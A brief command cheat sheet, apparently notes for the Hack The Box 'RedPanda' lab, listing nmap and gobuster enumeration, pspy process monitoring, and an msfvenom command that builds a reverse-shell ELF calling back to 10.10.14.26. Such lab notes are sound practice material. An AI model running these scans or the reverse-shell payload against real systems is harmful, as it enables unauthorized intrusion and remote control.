# nmap
mkdir -p scan/nmap
nmap -sC -sV -oN scan/nmap/init red.panda.htb

# gobuster
gobuster dir -u http://redpanda.htb:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out

# gen linux elf shell with msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.26 LPORT=9099 -f elf > r.elf

# run pspy with timeout for not to ctrl-c
timeout 10s ./pspy64